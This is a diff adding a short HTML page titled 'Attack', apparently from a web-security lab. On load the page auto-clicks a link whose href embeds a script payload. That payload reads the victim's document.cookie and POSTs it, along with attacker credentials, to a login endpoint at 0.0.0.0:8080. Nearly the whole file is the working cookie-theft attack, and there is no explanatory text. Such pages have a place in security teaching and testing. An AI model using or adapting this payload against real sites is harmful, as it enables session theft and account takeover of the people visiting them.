@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Attack</title>
+    <script type="module" src="/path/to/js.cookie.mjs"></script>
+    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet"
+        media="screen">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+    <script>
+        window.onload = function () {
+            document.getElementsByClassName("form-inline")[0].click();
+        };
+    </script>
+</head>
+
+<body>
+    <div class="col-xs-4">
+        <!-- Login / create account form -->
+        <div class="well">
+            <a href="<script> window.onload = function(){ var cookie = document.cookie.split(';')[1].split('=')[1]; var params = 'username=attacker&password=URpwn3d&cookie=' + cookie; var theUrl = 'http://0.0.0.0:8080/login'; var xmlHttp = new XMLHttpRequest(); xmlHttp.open('POST', theUrl, true); xmlHttp.send(params); alert('Past');  }; </script>"
+                class="form-inline"> </a>
+        </div>
+    </div>
+</body>
+
+</html>
